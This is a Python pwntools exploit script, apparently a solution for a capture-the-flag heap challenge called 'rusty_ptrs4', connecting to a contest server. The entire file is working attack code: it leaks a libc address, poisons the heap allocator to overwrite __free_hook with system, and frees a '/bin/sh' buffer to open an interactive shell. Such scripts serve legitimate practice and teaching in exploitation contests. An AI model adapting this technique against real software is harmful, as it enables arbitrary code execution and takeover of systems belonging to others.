#!/usr/bin/python3

from pwn import *

exe = ELF('rusty_ptrs4', checksec=False)
libc = ELF('libc-2.31.so')
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('rustyptrs.chal.uiuc.tf', 1337, ssl=True)
else:
    p = process(exe.path)
GDB()
ru = 1
no = 2


def cr(op):
    sla(b'>', b'1')
    sla(b'>', str(op))


def de(op, idx):
    sla(b'>', b'2')
    sla(b'>', str(op))
    sla(b'>', str(idx))


def sh(op, idx):
    sla(b'>', b'3')
    sla(b'>', str(op))
    sla(b'>', str(idx))


def ed(op, idx, pa):
    sla(b'>', b'4')
    sla(b'>', str(op))
    sla(b'>', str(idx))
    sla(b'>', pa)


sla(b'> ', b'5')
libc.address = int(p.recvuntil(b',', drop=True), 16) - 0x1ecbe0
info("libc.address " + hex(libc.address))
cr(no)
cr(no)
de(no, 1)
de(no, 0)
cr(ru)
ed(ru, 0, p64(libc.sym.__free_hook))
cr(no)
cr(no)
ed(no, 0, b'/bin/sh')
ed(no, 1, p64(libc.sym.system))
de(no, 0)
p.interactive()
